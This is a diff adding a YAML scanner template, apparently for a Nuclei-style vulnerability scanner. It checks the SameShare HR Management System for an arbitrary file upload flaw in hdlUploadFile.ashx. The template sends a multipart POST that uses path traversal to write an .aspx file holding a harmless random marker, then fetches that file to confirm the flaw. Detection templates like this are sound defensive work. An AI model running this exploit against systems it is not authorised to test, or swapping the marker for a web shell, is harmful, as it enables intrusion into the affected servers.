@@ -1,0 +1,48 @@
+id: poc-yaml-tosharesoft-hdluploadfile-ashx-anyfile-upload
+info:
+  name: SameShare HR Management System hdlUploadFile.ashx Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "/MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/{{t1}}"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------142851345723692939351758052805"
+    body: |-
+      -----------------------------142851345723692939351758052805
+      Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.aspx"
+      Content-Type: text/plain
+
+      {{t2}}
+      -----------------------------142851345723692939351758052805--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/Style"
+        part: body
+
+  - id: file-verification
+    method: GET
+    path:
+      - "/Style/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
